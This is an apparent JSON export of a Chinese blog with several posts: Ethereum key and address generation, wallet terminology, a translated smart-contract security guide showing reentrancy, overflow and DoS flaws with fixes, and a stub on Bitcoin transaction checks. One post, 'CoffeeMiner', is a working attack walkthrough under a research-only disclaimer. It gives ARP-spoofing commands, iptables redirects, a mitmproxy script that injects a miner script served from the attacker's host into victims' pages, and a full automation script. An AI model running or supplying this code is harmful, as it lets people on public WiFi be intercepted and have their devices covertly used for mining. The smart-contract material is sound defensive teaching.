{"meta":{"title":"星云比特","subtitle":null,"description":null,"author":"xingyunbite","url":"http://xingyunbite.github.com"},"pages":[],"posts":[{"title":"Java中创建完整的以太坊钱包","slug":"Java中创建完整的以太坊钱包","date":"2018-03-11T01:11:02.000Z","updated":"2018-03-11T01:26:15.868Z","comments":false,"path":"2018/03/11/Java中创建完整的以太坊钱包/","link":"","permalink":"http://xingyunbite.github.com/2018/03/11/Java中创建完整的以太坊钱包/","excerpt":"","text":"Java中创建完整的以太坊钱包以太坊中生成秘钥分为三步 生成EC私钥 通过私钥推出公钥 通过公钥算出密码 以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成 我们用OpenSSL来生成一个钥私，并且显示他的私有和公告部分 123456789101112131415openssl ecparam -name secp256k1 -genkey -noout | openssl ec -text -noout read EC keyPrivate-Key: (256 bit)priv: 00:bc:70:90:97:28:61:e0:92:72:74:c0:0f:b0:1d: c6:4c:e0:bc:a9:32:a7:b1:d2:9e:a5:1e:cd:2c:21: c2:e3:1dpub: 04:0f:ff:81:4f:59:ac:83:93:2f:5c:6c:74:ea:69: d4:75:74:9a:46:9a:f1:6e:eb:aa:2f:2a:59:d2:36: 5f:33:1f:7d:35:05:f5:57:15:11:3d:91:47:89:2d: 57:91:75:cc:cd:6e:61:e8:4c:b1:aa:cf:1d:fd:d7: 86:35:c4:55:c5ASN1 OID: secp256k1 openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式 私钥部分 123cat Key | grep priv -A 3 | tail -n +2 | tr -d &apos;\\n[:space:]:&apos; | sed &apos;s/^00//&apos;884f0da48660a3c22257fc36be4210ec6f975924ea399e6478c7596b852f25c4 公钥部分 123 cat Key | grep pub -A 5 | tail -n +2 |tr -d &apos;\\n[:space:]:&apos; |sed &apos;s/^04//&apos; f35862b021183deb90cb66978fc6f7c4bb5ae3e10d486a8109458e0f1ebbdb4602ed1f864bc91cada3eef79b3fb020313850b27c958cdd7567e5c7b9d7f66780 地址是取公钥后40个字符，通过keccak-256算法生成 地址 123cat pub | keccak-256sum -x -l | tr -d &apos; -&apos; | tail -c 4182a772a5c62b05cd51683872180a5dffef3a0c3e 接下来我们去myetherwallet验证一下这个钱包地址是否正确 导入私钥 通过比对发现私钥地址一致。我们在Java中再进行生成对比一下。 首先我们要导入ethereum Java中钱包生成公私钥地址的方法都在org.ethereum.crypto.ECKey包中的ECKey类中 通过源码我发现好像并没有提供直接通过私钥生成地址的方法,但是提供了一个可以通过私钥生成ECKey的构造方法，以及通过ECKey获取公钥，私钥，地址的方法 123public static ECKey fromPrivate(byte[] privKeyBytes) &#123; return fromPrivate(new BigInteger(1, privKeyBytes)); &#125; 1234@Nullable public byte[] getPrivKeyBytes() &#123; return this.privKey == null?null:(this.privKey instanceof BCECPrivateKey?ByteUtil.bigIntegerToBytes(((BCECPrivateKey)this.privKey).getD(), 32):null); &#125; 123public ECPoint getPubKeyPoint() &#123; return this.pub; &#125; 1234567public byte[] getAddress() &#123; if(this.pubKeyHash == null) &#123; this.pubKeyHash = computeAddress(this.pub); &#125; return this.pubKeyHash; &#125; 接下来根据这几个方法写一个测试类进行测试校验 发现私钥和地址是一样的公钥多了一个04的头部，去掉头部也是完全一样。 那我们怎么生成一个钱包？再看源码还有一个空参构造方法可以构造一个ECKey 123public ECKey() &#123; this(secureRandom); &#125; 我们生成一个钱包并在myetherwallet校验 通过校验发现我们生成的钱包与mywallet中一致。 参考： Generating a usable Ethereum wallet and its corresponding keys ethereumj","categories":[{"name":"钱包","slug":"钱包","permalink":"http://xingyunbite.github.com/categories/钱包/"}],"tags":[{"name":"ciscolxh","slug":"ciscolxh","permalink":"http://xingyunbite.github.com/tags/ciscolxh/"},{"name":"钱包","slug":"钱包","permalink":"http://xingyunbite.github.com/tags/钱包/"}],"keywords":[{"name":"钱包","slug":"钱包","permalink":"http://xingyunbite.github.com/categories/钱包/"}]},{"title":"手机钱包常见名词解释","slug":"手机钱包常见名词解释","date":"2018-03-11T00:44:06.000Z","updated":"2018-03-11T01:08:12.881Z","comments":false,"path":"2018/03/11/手机钱包常见名词解释/","link":"","permalink":"http://xingyunbite.github.com/2018/03/11/手机钱包常见名词解释/","excerpt":"","text":"在使用imtoken的时候创建一个钱包的的流程如下 这里涉及到的几个名词: 用户名、 密码、 钱包地址、 私钥、 Keystore、 助记词 这些分别是什么呢？又有些什么作用呢? 1.用户名：首先从用户名说起，用户名就是我们给不同钱包起的一个名字，如果没有用户名的话区分不同钱包就应该是用地址来区分了，地址是一个以0x开头的，42位的16进制数，相对来说是不好记忆更不方便我们区分钱包。 2.密码：密码的作用是保护钱包安全的。所有的敏感操作都要使用密码才能进行。 用途：1.导出私钥时候使用，2.导入导出keystore时使用，3.导出助记词时候使用，4.转账的时候使用 注意： 密码只是存在本地的，也就是说同一个钱包在A手机上设置了一个密码，导入B手机中并不需要设置和A手机中的密码一样。 3.钱包地址：钱包地址是一个以0x开头的十六进制的四十二位数。一个钱包只有一个地址。就相当于银行卡的银行卡号。 用途：1：你给别人转账的时候就是通过对方的钱包地址。2：查询转账记录也是通过钱包地址来查询的。 4.私钥：私钥是在创建钱包时候生成的。他是一个64 位 16 进制的哈希值字符串，例如：“ad025560b0db0bef204a12f67407d485661737698c62b345a84fc1aedf9ce7f9”。一个钱包对应一个私钥并且不能修改。私钥决定了钱包的所有权，可以通过密码导出私钥，也可以通过私钥把钱包导入另一个手机中去。 注意：通过A手机把私钥导出，然后再导入B手机中设置密码，密码不需要和A手机中的密码相同，就可以操作对应的钱包，所以私钥不要随便暴露给别人。 5.Keystore:文件是以太坊钱包存储私钥的一种文件格式 (JSON)，keystore相当于加密后的私钥，和私钥的用途是相同的，在A手机通过密码导出keystore，然后通过密码和keystore可以把钱包导入B手机中。但是使用方法有些许不同，通过秘钥导入可以在B手机随便设置密码，而通过keystore导入的时候必须使用导出时候用到的密码。也就是生成的keystore和生成时候的密码相匹配。如果密码丢失你也失去了对keystore的控制权。 6.助记词：助记词，可以在第一次创建账户后导出，助记词是私钥的另一种表现形式，助记词一般由12、15、18、21个单词构成，他的作用和私钥是一样的。拿到助记词可以把钱包导入手机，操作钱包。 注意： 私钥=助记词=keystory+密码，私钥，助记词，keystory一定要妥善保管，可以通过他们三个任何一个都可以把钱包备份到另一个设备导入另一个设备，如果丢失只能尽快把钱包中的币转入安全的钱包中。","categories":[{"name":"钱包","slug":"钱包","permalink":"http://xingyunbite.github.com/categories/钱包/"}],"tags":[{"name":"ciscolxh","slug":"ciscolxh","permalink":"http://xingyunbite.github.com/tags/ciscolxh/"},{"name":"钱包","slug":"钱包","permalink":"http://xingyunbite.github.com/tags/钱包/"}],"keywords":[{"name":"钱包","slug":"钱包","permalink":"http://xingyunbite.github.com/categories/钱包/"}]},{"title":"劫持公共WIFI挖矿研究","slug":"劫持公共WIFI挖矿研究","date":"2018-03-09T08:10:09.000Z","updated":"2018-03-10T08:28:27.902Z","comments":false,"path":"2018/03/09/劫持公共WIFI挖矿研究/","link":"","permalink":"http://xingyunbite.github.com/2018/03/09/劫持公共WIFI挖矿研究/","excerpt":"","text":"##警告:本篇文章和文章内提及的项目仅限于学术研究. 这篇文章的目的是解释如何做MITM（Man（Person） In The Middle）的攻击，在html页面注入javascript，强制连接到WiFi网络的所有设备都为攻击者挖掘门罗币. 攻击者有一个脚本可以执行对WiFi网络的自主攻击，我将其称为CoffeeMiner，因为这是一种可以在咖啡馆WiFi网络中执行的攻击. 这种攻击就是将一些设备连接到WiFi网络，并且CoffeeMiner攻击者会在连接过程中拦截用户和路由器之间的流量. 正常WIFI网络配置: Victim:连接到路由器并浏览页面的机器Attacker:运行CoffeeMiner的机器,将执行MITM.gateway/router:正常的路由器 一旦执行攻击,情况将是: 攻击者要配置每台机器将执行以下配置： Victim:123ip地址 : 10.0.2.10子网掩码 : 255.255.255.0默认网关:10.0.0.15 Attacker:123ip地址 : 10.0.2.20子网掩码 : 255.255.255.0默认网关:10.0.0.15 gateway/router:1234网络0设置dhcp自动获取.网络1:ip地址 : 10.0.2.15子网掩码 : 255.255.255.0 1.CoffeeMiner的攻击代码1.1 ARP欺骗中间人攻击是一种由来已久的网络入侵手段，并且在今天仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击.简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情. 随着计算机通信网技术的不断发展，MITM攻击也越来越多样化.最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等.后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行. 如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的. 所以要执行ARP欺骗攻击，我就将使用dsniff库. 12arpspoof -i interface -t ipVictim ipGatewayarpspoof -i interface -t ipGateway ipVictim 1.2 mitmproxy需要在html页面注入代码,可以使用mitmproxy分析主机的流量，并对该流量做手脚.在这个案例中，攻击者将使用它将javascript注入html页面.为了使这个虚拟过程简单易操作，这里在html页面中只注入一行代码，然后调用JavaScript挖矿的HTML代码行.注入挖矿代码的流程如下所示：1&lt;script src=&quot;http://httpserverIP:8080/script.js&quot;&gt;&lt;/script&gt; 1.3 注入器一旦拦截了受害者的流量，就需要注入攻击者的挖矿脚本.使用mitmproxy API来完成注入. 123456789101112131415161718192021222324from bs4 import BeautifulSoupfrom mitmproxy import ctx, httpimport argparseclass Injector: def __init__(self, path): self.path = path def response(self, flow: http.HTTPFlow) -&gt; None: if self.path: html = BeautifulSoup(flow.response.content, \"html.parser\") print(self.path) print(flow.response.headers[\"content-type\"]) if flow.response.headers[\"content-type\"] == 'text/html': script = html.new_tag( \"script\", src=self.path, type='application/javascript') html.body.insert(0, script) flow.response.content = str(html).encode(\"utf8\") print(\"Script injected.\")def start(): parser = argparse.ArgumentParser() parser.add_argument(\"path\", type=str) args = parser.parse_args() return Injector(args.path) 1.4 HTTP服务器正如以上你看到的，向注入器添加了一行指向HTML的代码，以调用JavaScript挖矿.所以，还需要在HTTP服务器中部署脚本文件. 为了实现javascript 加密挖矿，攻击者要在设备中部署一个HTTP服务器.这里使用Python库“http.server”：12345678910import http.serverimport socketserverimport osPORT = 8000web_dir = os.path.join(os.path.dirname(__file__), 'miner_script')os.chdir(web_dir)Handler = http.server.SimpleHTTPRequestHandlerhttpd = socketserver.TCPServer((\"\", PORT), Handler)print(\"serving at port\", PORT)httpd.serve_forever() 上面的代码就是一个简单的HTTP服务器，它将在需要时执行攻击者设置的挖矿服务.JavaScript挖矿将被放置在/miner_script目录中.在这个案例中，使用了CoinHive JavaScript挖矿工具. *Coinhive是一个提供恶意JS脚本的网站平台（https://coin-hive[.]com），允许攻击者将脚本挂在到自己的或入侵的网站上，所有访问该网站的用户都可能成为门罗币的挖掘矿工.Coinhive工具其实是一个JavaScript库，用户访问加载该JS的网站后，Coinhive的JS代码库在用户的浏览器上运行，开始为网站所有者挖掘门罗币，消耗的是用户自己的CPU资源。它可以被添加进一个网站，并将使用用户的CPU功率来计算哈希与Cryptonight PoW哈希算法来挖掘基于CryptoNote协议的门罗币.不过CoinHive的执行要在网站的运行时间超过四十秒时才会有效，如果用户意识到自己打开了一个有问题的页面，立马关闭，则CoinHive就会运行失败. 2.CoffeeMiner的运行在以上这些条件准备好以后，开始执行CoffeeMiner，进而让CoffeeMiner脚本执行ARPspoofing攻击，并用mitmproxy将CoinHive cryptominer注入受害者的HTML页面。为此，需要首先配置ip_forwarding和IPTABLES，以便将攻击者的设备转换为代理。 123echo 1 &gt; /proc/sys/net/ipv4/ip_forwardiptables -t nat -A POSTROUTING -o eth0 -j MASQUERADEiptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 为了对所有受害者执行ARP欺骗，我将为受害者的所有IP准备一个“victim.txt”文件。不过要读取所有受害者IP，就准备一些Python行，它将获得IP（以及命令行参数中的网关IP），并对每个受害者的IP执行ARP欺骗。12345678910gateway = sys.argv[1]print(\"gateway: \" + gateway)# get victims_ipvictims = [line.rstrip('n') for line in open(\"victims.txt\")]print(\"victims:\")print(victims)# run the arpspoof for each victim, each one in a new consolefor victim in victims: os.system(\"xterm -e arpspoof -i eth0 -t \" + victim + \" \" + gateway + \" &amp;\") os.system(\"xterm -e arpspoof -i eth0 -t \" + gateway + \" \" + victim + \" &amp;\") 一旦执行了ARP欺骗，只需要运行HTTP服务器即可.1&gt; python3 httpServer.py 现在，可以用injector.py运行mitmproxy了. 1&gt; mitmdump -s 'injector.py http://httpserverIP:8080/script.js' 3.CoffeeMiner的最终挖矿脚本现在把上面解释的所有概念都放在’coffeeMiner.py’脚本中：12345678910111213141516171819202122import osimport sys#get gateway_ip (router)gateway = sys.argv[1]print(\"gateway: \" + gateway)# get victims_ipvictims = [line.rstrip('n') for line in open(\"victims.txt\")]print(\"victims:\")print(victims)# configure routing (IPTABLES)os.system(\"echo 1 &gt; /proc/sys/net/ipv4/ip_forward\")os.system(\"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\")os.system(\"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\")os.system(\"iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080\")# run the arpspoof for each victim, each one in a new consolefor victim in victims: os.system(\"xterm -e arpspoof -i eth0 -t \" + victim + \" \" + gateway + \" &amp;\") os.system(\"xterm -e arpspoof -i eth0 -t \" + gateway + \" \" + victim + \" &amp;\")# start the http server for serving the script.js, in a new consoleos.system(\"xterm -hold -e 'python3 httpServer.py' &amp;\")# start the mitmproxyos.system(\"~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T\") 在’injector.py’脚本中：12345678910111213141516171819202122232425from bs4 import BeautifulSoupfrom mitmproxy import ctx, httpimport argparseclass Injector: def __init__(self, path): self.path = path def response(self, flow: http.HTTPFlow) -&gt; None: if self.path: html = BeautifulSoup(flow.response.content, \"html.parser\") print(self.path) print(flow.response.headers[\"content-type\"]) if flow.response.headers[\"content-type\"] == 'text/html': print(flow.response.headers[\"content-type\"]) script = html.new_tag( \"script\", src=self.path, type='application/javascript') html.body.insert(0, script) flow.response.content = str(html).encode(\"utf8\") print(\"Script injected.\")def start(): parser = argparse.ArgumentParser() parser.add_argument(\"path\", type=str) args = parser.parse_args() return Injector(args.path) 要执行挖矿，只需要执行以下操作：1&gt; python3 coffeeMiner.py RouterIP 当然也可以手动运行. 结论正如我们所看到的，攻击者可以轻松执行，也可以部署为WiFi网络中的自主攻击. 另一个想到的是，对于真实世界的WiFi网络来说，使用强大的WiFi天线执行攻击过程，以扩大攻击范围. 虽然攻击者主要目标是执行自主攻击，但我们仍然需要使用受害设备的IP地址编辑victim.txt文件. 对于更多版本，可能的功能可能是添加自主的Nmap扫描，将检测到的IP添加到CoffeeMiner受害者列表中. 另一个功能，可能是添加sslstrip，以确保注入也在用户可以通过HTTPS请求的网站中. 附:完整的攻击代码：https：//github.com/arnaucode/coffeeMiner","categories":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}],"tags":[{"name":"lucas556","slug":"lucas556","permalink":"http://xingyunbite.github.com/tags/lucas556/"},{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/tags/矿池/"},{"name":"门罗币","slug":"门罗币","permalink":"http://xingyunbite.github.com/tags/门罗币/"},{"name":"CoffeeMiner","slug":"CoffeeMiner","permalink":"http://xingyunbite.github.com/tags/CoffeeMiner/"},{"name":"MITM","slug":"MITM","permalink":"http://xingyunbite.github.com/tags/MITM/"},{"name":"CoinHive","slug":"CoinHive","permalink":"http://xingyunbite.github.com/tags/CoinHive/"}],"keywords":[{"name":"矿池","slug":"矿池","permalink":"http://xingyunbite.github.com/categories/矿池/"}]},{"title":"智能合约最佳实践翻译三","slug":"智能合约最佳实践翻译三","date":"2018-03-09T03:17:08.000Z","updated":"2018-03-09T09:32:59.585Z","comments":false,"path":"2018/03/09/智能合约最佳实践翻译三/","link":"","permalink":"http://xingyunbite.github.com/2018/03/09/智能合约最佳实践翻译三/","excerpt":"","text":"已知攻击以下列出了你应该知道的已知攻击，并且在编写智能合约的时候进行防御。 竞争条件(Race Conditions)调用外部合约的一个主要危险之一是它会接管控制流，并且修改调用方法不被 期望修改的数据。这种类型的 bug 有很多形式，导致 DAO 崩溃的两个主要错误都是这类错误。 重入(Reentrancy)这个 bug 的第一个版本需要注意，这个函数可以在函数第一次调用完成之前重复调用。 这可能会导致函数的不同调用以破坏性方式进行交互。123456789// insecuremapping(address =&gt; uint) private userBalances;function withdrawBalance() public &#123; uint amountToWithdraw = userBalances[msg.sender]; require(msg.sender.call.value(amountToWithdraw)()); // At this point, the call&apos;s code is executed, and can call withdrawBalance again userBalances[msg.sender] = 0;&#125; 因为用户余额直到最后被提取完才会被设置成 0，所以第二次（和更之后）的调用仍然会成功，从而一次又一次地提取余额。一个非常类似的 bug 是 DAO 攻击中的一个漏洞。 在给出的例子中，避免这个问题的最好的办法是通过 使用 send() 代替 call.value()()。这会防止执行中的任何外部代码。 然而，如果你不能移除外部调用，下一个简单地防止此攻击的方法是确保直到你完成了所有的内部工作之前都没有调用外部函数，你需要做：1234567mapping(address =&gt; uint) private userBalances;function withdrawBalance() public &#123; uint amountToWithdraw = userBalances[msg.sender]; userBalances[msg.sender] = 0; require(msg.sender.call.value(amountToWithdraw)());&#125; 注意，如果你有另一个调用了 withdrawBalance()的函数，它可能会受到相同的攻击，所以你必须对调用了不可信合约的函数也视为不可信。请参阅下方的潜在解决方案的进一步讨论。 函数交叉竞争条件(Cross-function Race Conditions)一个攻击者可能使用通过两个不同的函数共享一个状态来进行类似的攻击。 12345678910111213141516// insecuremapping(address =&gt; uint) private userBalances;function transfer(address to, uint amount) &#123; if (userBalances[msg.sender] &gt;= amount) &#123; userBalance[to] += amount; userBalance[msg.sender] -= amount; &#125;&#125;function withdrawBalance() public &#123; uint amountToWithdraw = userBalances[msg.sender]; require(msg.sender.call.value(amountToWithdraw)()); // At this point, the caller&apos;s code is executed, and can call transfer() userBalances[msg.sender] = 0;&#125; 在这个例子中，当攻击者的代码在 withdrawBalance() 中的外部调用中被执行，攻击者会调用 transfer()。只要他们的余额不是 0，那么他们就可以在已经收到过一次提币的情况下，再次转移 token。这个漏洞也在 DAO 攻击中被使用。 在相同的警告下，相同的解决方案也会起作用。也要注意，在这个例子中，函数都是同一个合约的一部分。但是，如果多个合约共享状态，那么相同的 bug 也可以出现在交叉的多重合约中。 竞争条件解决方案中的陷阱因为竞争条件可以在多个函数，甚至多个合约中发生，所以任何旨在防止重入的解决方案都是不够的。 相反，我们推荐在完成全部的内部工作之后再调用外部函数。如果你小心地遵循了这个规则，就可以避免竞争条件。但是，你不止要避免太早调用外部函数，也要避免调用了外部函数的函数。举例来说，下面是不安全的：123456789101112131415161718// insecuremapping(address =&gt; uint) private userBalances;mapping(address =&gt; bool) private claimedBonus;mapping(address =&gt; uint) private rewardsForA;function withdraw(address recipient) public &#123; uint amountToWithdraw = userBalances[recipient]; rewardsForA[recipient] = 0; require(recipient.call.value(amountToWithdraw)());&#125;function getFirstWithdrawalBonus(address recipient) public &#123; require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once rewardsForA[recipient] += 100; withdraw(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again. claimedBonus[recipient] = true;&#125; 即使 getFirstWithdrawalBonus() 没有直接调用外部合约，withdraw() 内的调用已经足够产生一个竞争条件的漏洞。因此你不可以信任 withdraw() 函数。1234567891011121314151617mapping(address =&gt; uint) private userBalances;mapping(address =&gt; bool) private claimedBonus;mapping(address =&gt; uint) private rewardsForA;function untrustedWithdraw(address recipient) public &#123; uint amountToWithdraw = userBalances[recipient]; rewardsForA[recipient] = 0; require(recipient.call.value(amountToWithdraw)());&#125;function untrustedGetFirstWithdrawalBonus(address recipient) public &#123; require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once claimedBonus[recipient] = true; rewardsForA[recipient] += 100; untrustedWithdraw(recipient); // claimedBonus has been set to true, so reentry is impossible&#125; 除了修复重入的问题，不受信任的函数也被标记了。这个模式在每个层级都被重复使用：既然 untrustedGetFirstWithdrawalBonus() 调用了调用了外部合约的 untrustedWithdraw()，那么你就必须将 untrustedGetFirstWithdrawalBonus() 视作不安全的。 另一个经常建议的解决方案是一个 互斥。它允许你 “锁定” 某些状态，所以状态只能被锁的拥有者改变。一个简单的例子如下：1234567891011121314151617181920212223// Note: This is a rudimentary example, and mutexes are particularly useful where there is substantial logic and/or shared statemapping(address =&gt; uint) private balance;bool private lockBalances;function deposit() payable public returns (bool) &#123; require(!lockBalances); lockBalances = true; balances[msg.sender] += msg.value; lockBalances = false; return true;&#125;function withdraw(uint amount) payable public returns (bool) &#123; require(!lockBalances &amp;&amp; amount &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount); lockBalances = true; if (msg.sender.call(amount)()) &#123; balances[msg.sender] -= amount; &#125; lockBalances = false; return true;&#125; 如果用户试图在第一个调用结束前再次调用 withdraw()，锁就会防止其作用。这是一个有用的方式，但是当你有多个合约合作的时候，就会有一些困难。下面是不安全的：123456789101112131415161718192021// insecurecontract StateHolder &#123; uint private n; address private lockHolder; function getLock() &#123; require(lockHolder == 0); lockHolder = msg.sender; &#125; function releaseLock() &#123; require(msg.sender == lockHolder); lockHolder = 0; &#125; function set(uint newState) &#123; require(msg.sender == lockHolder); n = newState; &#125;&#125; 一个攻击者可以调用 getLock()，之后就永远不用调用 releaseLock()。如果他们这么干了，那么合约将被永远锁定，无法进行任何修改。如果你使用互斥来防止竞争条件，那么你需要小心地确认不会出现只能锁定而不能释放的情况。（使用互斥编程也有其他潜在的危险，如死锁和活锁。如果你想要使用这种方式，你应该查阅咨询大量互斥相关的文献资料。） 有些人可能会反对使用术语竞争条件，因为以太坊目前没有真正的并行性。 然而，逻辑上不同的进程争夺资源的基本特征仍然存在，同样的陷阱和潜在的解决方案也适用。交易顺序依赖（TOD）/ 前台运行以上的竞争条件示例涉及到攻击者在单笔交易中执行恶意代码。以下是区块链固有的一种不同类型的竞争条件：交易本身（在区块内）的顺序容易受到操纵。 在被打包进区块之前，交易会进入内存池一段时间，因此可以知道交易在被打包之前有什么行为。对于像去中心化市场这类对象来说，这可能会有些麻烦，在这种市场中，可能看到买入 token 的交易，和其他交易被包含之前的市场顺序实现形式。防止这种情况很困难，因为它会涉及到具体合约本身。举例来说，在市场中，实施批量拍卖会更好（这也可以防止高频交易问题）。另一种方法是使用预先提交方案（“我将在稍后提交细节”）。 时间戳依赖注意区块的时间戳可以被矿工操作，所以在不管是直接还是间接的对时间戳的使用中要多加考虑。 有关与时间戳相关的设计注意事项，请参阅 建议 部分。 整数溢出和下溢考虑一个简单的 token 转移：1234567891011121314151617181920mapping(address =&gt; uint256) public balanceOf;// insecurefunction transfer(address _to, uint256 _value) &#123; // check if sender has balance require(balanceOf[msg.sender] &gt;= _value); // add and subtract new balances balanceOf[msg.sender] -= _value; balanceOf[_to] += _value;&#125;// securefunction transfer(address _to, uint256 _value) &#123; // check if sender has balance and for overflows require(balanceOf[msg.sender] &gt;= _value &amp;&amp; balanceOf[_to] + _value &gt;= balanceOf[_to]); // add and subtract new balances balanceOf[msg.sender] -= _value; balanceOf[_to] += _value;&#125; 如果余额到达了 uint 值（2^256）的最大值，它会被置为零。这是检查这个条件。这可能有关也可能无关，取决于实现方式。考虑一下 uint 值是否有这个机会达到这么大的一个数字。考虑 uint 变量是如何改变状态的，并且谁有权限来做这样的改变。如果任意用户都可以更新 uint 值，那么就会有很多的攻击漏洞。如果只有一个管理者拥有权限来修改变量的状态，那你可能是安全的。如果一个用户每次尽能增加 1，那你也可能是安全的，因为并没有可行的方式来达到限制。 对于下溢来说也是一样的。如果一个 uint 被设置成小于 0，这就会导致一个下溢然后被设置成它的最大值。 对 uint8, uint16, uint24… 等更小的数据类型要小心：它们会更容易的达到它们的最大值。 注意这里有大约 20 个关于溢出和下溢的例子 （不期望的）回滚导致的 DoS考虑一个简单的拍卖合约：123456789101112131415// insecurecontract Auction &#123; address currentLeader; uint highestBid; function bid() payable &#123; require(msg.value &gt; highestBid); require(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert currentLeader = msg.sender; highestBid = msg.value;; &#125;&#125; 当它试图退款给用户的时候，当退款失败，它会回滚。意思是一个恶意的竞标者可以通过让它们的退款总是失败而变成领导者。在这个方式中，它们可以防止其他任何人调用 bid() 函数，然后保证自己一直都是领导者。一个推荐是如之前所述，设置一个 拉取支付系统 来替代。 另一个例子是当一个合约想要通过便利一个数组来支付给用户（如，在众筹合约中的支持者）。通常都想要确保每一笔支付都成功。如果没有的话，就回滚。这个问题是如果一个调用失败了，你就会回滚整个支付系统，那么循环将永远不会完成。因为一个地址强制错误所以没有人获得报酬。 123456789address[] private refundAddresses;mapping(address =&gt; uint) public refunds;// badfunction refundAll() public &#123; for (uint x; x &lt; refundAddresses.length; x++) &#123; // // arbitrary length iteration based on how many addresses participated require(refundAddresses[x].send(refunds[refundAddresses[x]])) // doubly bad, now a single failure on send will hold up all funds &#125;&#125; 再一次，推荐的解决方法是 赞成拉推支付。 区块燃料限制导致的 DoS你可能注意到了之前的例子中的另一个问题：一次性支付给所有人，你会有触及区块燃料限制的风险。每一个以太坊区块都能处理一个确定的最大算力值。如果你想要超过它，那你的交易就会失败。 即使没有故意的攻击，这也会造成问题。但是，如果攻击者可以操纵所需的燃料值，就会特别糟糕。在之前的例子中，攻击者可以添加大量地址，每一个都需要获得极销量的退款。攻击者的每一个地址退款操作的燃气消耗最终可能超过燃料限制，从而阻止退款交易的发生。 这是另一个 赞成推拉支付 的原因。 如果你必须完全遍历一个你不知道大小的数组，那么你应该计划它可能需要多个区块，因而需要多个交易。你会需要对你当前的进度保持跟踪，并且能够从那个点恢复，就像下面这个例子：12345678910111213141516struct Payee &#123; address addr; uint256 value;&#125;Payee[] payees;uint256 nextPayeeIndex;function payOut() &#123; uint256 i = nextPayeeIndex; while (i &lt; payees.length &amp;&amp; msg.gas &gt; 200000) &#123; payees[i].addr.send(payees[i].value); i++; &#125; nextPayeeIndex = i;&#125; 你会需要确认在等待 payOut() 函数的下一个遍历的时候，如果其他交易被处理，不会有不好的事情发生。所以只在完全必要的时候使用这个模式。 强制将 ETH 发送到合约可以不通过触发合约的 fallback 函数来强行将 ETH 发送到合约。当 fallback 函数内有重要的逻辑或者进行了基于合约余额的计算时，这是一个很重要的考虑。见下面的例子：12345678910contract Vulnerable &#123; function () payable &#123; revert(); &#125; function somethingBad() &#123; require(this.balance &gt; 0); // do something bad &#125;&#125; 合约逻辑看起来并不允许合约被支付，因此也不允许 “一些坏事” 发生。但是，存在一些强制发送 ETH 给合约的方法，因此它的余额大于 0。 合约方法 selfdestruct 允许用户指定一个受益人发送多余的 ETH。selfdestruct 不会触发合约的 fallback 函数。 也可以预先计算合约的地址，然后在合约部署之前给那个地址发送 ETH。 合约开发者应该注意 ETH 可以被强制发送给合约并且应该设计相应的合约逻辑。通常来说，假设不可能限制你的合约的资金来源。 废弃的 / 历史的攻击这些攻击由于协议的改变或固体的改进而不再可能发生。 调用深度攻击（废弃）在 EIP 150 的硬分叉中，调用深度攻击不再相关*（在达到 1024 调用深度限制之前，所有气体都将消耗得很好）。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}],"tags":[{"name":"ZhouFyk","slug":"ZhouFyk","permalink":"http://xingyunbite.github.com/tags/ZhouFyk/"},{"name":"以太坊","slug":"以太坊","permalink":"http://xingyunbite.github.com/tags/以太坊/"},{"name":"智能合约","slug":"智能合约","permalink":"http://xingyunbite.github.com/tags/智能合约/"},{"name":"安全开发","slug":"安全开发","permalink":"http://xingyunbite.github.com/tags/安全开发/"}],"keywords":[{"name":"区块链","slug":"区块链","permalink":"http://xingyunbite.github.com/categories/区块链/"}]},{"title":"比特币挖矿之交易校验","slug":"比特币挖矿之交易校验","date":"2018-03-09T03:16:06.000Z","updated":"2018-03-09T09:25:39.979Z","comments":false,"path":"2018/03/09/比特币挖矿之交易校验/","link":"","permalink":"http://xingyunbite.github.com/2018/03/09/比特币挖矿之交易校验/","excerpt":"","text":"在比特币挖矿之矿工任务中我们提到矿工的任务之一是监听交易广播，验证交易是否有效，但是没有具体的说明校验规则，在本文中我们将对交易的校验规则进行具体介绍。 